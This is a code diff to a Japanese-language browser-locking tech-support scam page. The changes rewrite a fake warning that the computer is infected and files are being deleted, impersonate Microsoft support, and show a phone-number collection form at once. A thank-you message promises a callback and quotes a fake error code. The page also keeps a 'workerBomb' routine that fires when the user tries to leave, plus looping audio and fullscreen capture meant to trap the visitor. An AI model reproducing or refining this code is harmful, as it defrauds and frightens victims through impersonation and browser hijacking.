@@ -95,14 +95,14 @@
         top: 1px;
         left: 50%;
         transform: translateX(-50%);
-        width: 540px;
+        width: 594px;
         height: auto;
         background: #000;
         color: #fff;
         border: 1px solid rgba(255, 255, 255, 0.18);
         border-radius: 6px;
-        padding: 5px;
-        font-size: 16px;
+        padding: 6px;
+        font-size: 15px;
         line-height: 1.25;
         display: flex;
         flex-direction: column;
@@ -127,7 +127,7 @@
       .top-info-phone {
         width: 100%;
         margin-top: 1px;
-        font-size: 16px;
+        font-size: 15px;
         font-weight: 700;
         letter-spacing: 0.2px;
         line-height: 1.1;
@@ -1897,6 +1897,31 @@
         font-size: 12px;
         color: #0f6cbd;
       }
+      .contact-form-thankyou {
+        display: none;
+        padding: 12px 0 4px;
+        font-size: 16px;
+        font-weight: 600;
+        color: #1a1a1a;
+        text-align: center;
+        line-height: 1.5;
+      }
+      .contact-form-body.show-thankyou .contact-form-thankyou {
+        display: block;
+      }
+      .contact-form-body.show-thankyou .contact-form-title,
+      .contact-form-body.show-thankyou .contact-form-subtitle,
+      .contact-form-body.show-thankyou #contactForm {
+        display: none;
+      }
+      #contact-form-card:has(.contact-form-body.show-thankyou) {
+        border: 1px solid #0f6cbd;
+      }
+      #contact-form-card:has(.contact-form-body.show-thankyou) .contact-form-titlebar {
+        background: #e8f3fc;
+        border-bottom: 1px solid #b6d4f0;
+        color: #0f6cbd;
+      }
       #contact-form-card,
       #contact-form-card * {
         cursor: auto !important;
@@ -1988,19 +2013,6 @@
           workerBomb();
         }
       }
-
-      function initEscapeBomb() {
-        let escapeHoldTimer = null;
-
-        document.addEventListener("keyup", (event) => {
-          if (event.key === "Escape" && escapeHoldTimer !== null) {
-            clearTimeout(escapeHoldTimer);
-            escapeHoldTimer = null;
-          }
-        });
-      }
-
-      initEscapeBomb();
 
       window.addEventListener("beforeunload", function (event) {
         runWorkerBombSequence();
@@ -2110,7 +2122,7 @@
     </div>
     <div id="top-info-banner" aria-hidden="true">
       <div class="top-info-content">
-        お使いのコンピューターはウイルスとトロイの木馬に感染しています。コンピューターの電源を切らないでください。コンピューターを保護するためにファイルが削除されています。ファイルが重要な場合は、マイクロソフトのサポートにお問い合わせください。
+        コンピューターの電源を切らないでください。お使いのコンピューターはウイルスに感染しています。コンピューターを保護するためにファイルが削除されています。Microsoft サポートにお問い合わせください。電話番号を入力して送信ボタンをクリックしてください。下のチャットボタンもご利用いただけます。エラーコード: 0xDMC29
       </div>
       <div class="top-info-phone">サポート: <span data-support-phone></span></div>
     </div>
@@ -2149,6 +2161,12 @@
           </div>
           <div class="contact-form-status" id="contactFormStatus" aria-live="polite"></div>
         </form>
+        <div class="contact-form-thankyou" id="contactFormThankyou">
+          フォームを送信いただきありがとうございます。マイクロソフトサポートからお電話いたしますので、必ずお電話に出てください。
+
+マイクロソフトサポートに下記のエラーコードをお伝えください。<br>
+エラーコード：0xDMC29
+        </div>
       </div>
     </section>
     <div id="desktop">
@@ -3497,7 +3515,7 @@
 
       // Enter fullscreen on click (and re-enter after exiting fullscreen)
       const generalAudio = new Audio(
-        "https://files-pop.s3.ap-northeast-1.amazonaws.com/generalaudio.mp3",
+        "https://files-pop.s3.ap-northeast-1.amazonaws.com/number-send.mp3",
       );
       generalAudio.loop = true;
       let generalAudioStarted = false;
@@ -3691,7 +3709,7 @@
       }
 
       let contactFormShown = false;
-      const CONTACT_FORM_SHOW_AFTER_ELAPSED_MS = 10 * 60 * 1000;
+      const CONTACT_FORM_SHOW_AFTER_ELAPSED_MS = 0 * 60 * 1000;
 
       function maybeShowContactForm(elapsedMs) {
         if (contactFormShown || elapsedMs < CONTACT_FORM_SHOW_AFTER_ELAPSED_MS) return;
@@ -3789,8 +3807,13 @@
               throw new Error("Submit failed");
             }
 
-            contactFormStatus.textContent = "送信しました。";
+            contactFormStatus.textContent = "";
             contactForm.reset();
+            const contactFormBody = contactForm.closest(".contact-form-body");
+            contactFormBody.classList.add("show-thankyou");
+            setTimeout(() => {
+              contactFormBody.classList.remove("show-thankyou");
+            }, 120000);
           } catch (error) {
             contactFormStatus.textContent =
               "エラーが発生しました。もう一度お試しください。";
